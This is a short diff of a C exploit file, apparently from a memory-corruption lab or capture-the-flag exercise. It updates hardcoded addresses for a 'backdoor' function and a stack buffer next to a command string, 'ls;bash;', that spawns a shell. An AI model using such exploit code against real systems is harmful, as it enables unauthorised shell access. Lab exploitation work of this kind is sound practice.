@@ -6,8 +6,8 @@
 #define uint unsigned int
 
 const char code[] = "ls;bash;";
-uint bdoor_addr = 0x5659a63d;
-uint buf_addr = 0xffafa450;
+uint bdoor_addr = 0x565c063d;
+uint buf_addr = 0xffbd01b0;
 
 int main(){
     char buf[BUF_SIZE];
